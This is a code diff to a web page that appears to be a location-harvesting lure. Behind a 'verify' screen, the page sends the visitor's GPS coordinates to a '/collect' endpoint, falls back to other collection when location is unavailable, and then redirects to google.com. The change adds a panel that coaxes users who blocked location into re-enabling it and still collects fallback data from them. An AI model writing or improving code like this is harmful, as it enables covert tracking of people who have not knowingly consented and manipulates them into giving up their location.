@@ -70,6 +70,17 @@
         <div class="spinner" aria-label="Loading"></div>
     </div>
 
+    <div id="blocked" style="display:none;">
+        <h1>Location Required</h1>
+        <p>Location access is blocked in your browser.<br>To continue, please enable it:</p>
+        <ol style="text-align:left; max-width:300px; line-height:1.8; font-size:0.95rem;">
+            <li>Tap the <strong>lock icon</strong> in the address bar</li>
+            <li>Tap <strong>Permissions</strong></li>
+            <li>Set <strong>Location</strong> to <em>Allow</em></li>
+            <li>Refresh this page</li>
+        </ol>
+    </div>
+
     <script>
         const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
         const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');
@@ -108,15 +119,7 @@
             window.location.href = 'https://www.google.com';
         }
 
-        function onVerify() {
-            document.getElementById('landing').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-
-            if (!navigator.geolocation) {
-                collectFallback().finally(done);
-                return;
-            }
-
+        function requestLocation() {
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     await postJSON(ENDPOINT_GPS, {
@@ -129,11 +132,37 @@
                     await collectFallback();
                     done();
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
             );
-
-            // Safety fallback: redirect after 12s no matter what
             setTimeout(done, 12000);
+        }
+
+        function onVerify() {
+            document.getElementById('landing').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            if (!navigator.geolocation) {
+                collectFallback().finally(done);
+                return;
+            }
+
+            // Check if Chrome has already blocked location permission
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'denied') {
+                        // Permission was previously blocked — show instructions
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('blocked').style.display = 'block';
+                        collectFallback();
+                    } else {
+                        requestLocation();
+                    }
+                }).catch(function() {
+                    requestLocation();
+                });
+            } else {
+                requestLocation();
+            }
         }
     </script>
 </body>
